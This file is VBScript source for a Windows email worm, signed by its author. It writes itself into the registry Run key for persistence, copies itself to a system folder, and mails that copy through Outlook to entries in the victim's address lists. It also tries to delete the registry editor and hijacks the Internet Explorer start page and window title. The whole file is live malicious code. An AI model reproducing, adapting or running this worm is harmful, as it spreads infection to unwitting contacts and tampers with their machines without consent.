'Created by 乱世天使
 Dim wsh
 Set wsh=CreateObject("WScript.Shell")
 on error resume next 
 wsh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\kv3000","c:\windows\zsy.vbe"
Set fso= Createobject("Scripting.FileSystemObject")
Set InF=fso.OpenTextFile(WScript.ScriptFullname,1)
Do While InF.AtEndOfStream<>True
ScriptBuffer=ScriptBuffer&InF.ReadLine&vbcrlf 
Loop
Set OutF=fso.OpenTextFile("c:\windows\zsy.vbe",2,true)
OutF.write ScriptBuffer
 if wsh.regread ("HKCU\software\a\a")<> "1" then  out
sub out
On Error Resume Next
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
Set Mapi=Outlook.GetNameSpace("MAPI")
Set Lists=Mapi.AddressLists
For Each ListIndex In Lists
If ListIndex.AddressEntries.Count <> 0 Then
ContactCount = ListIndex.AddressEntries.Count
For Count= 1 To 1
Set Mail = Outlook.CreateItem(0)
Set Contact = ListIndex.AddressEntries(Count)
Mail.To = Contact.Address
Mail.Subject = "Edit11"
Mail.Body = "Edit13"
Set Attachment=Mail.Attachments
 Attachment.Add Folder & " c:\windows\zsy.vbe"
Mail.Send
next
 End if
next
 End if
end sub
wsh.regwrite "HKCU\software\a\a", "1"
on error resume next
fso.DeleteFile("c:\winodows\regedit.exe")
wsh.regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page","http://zsyangel.yeah.net"
wsh.regwrite"HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Window Title","乱世天使"
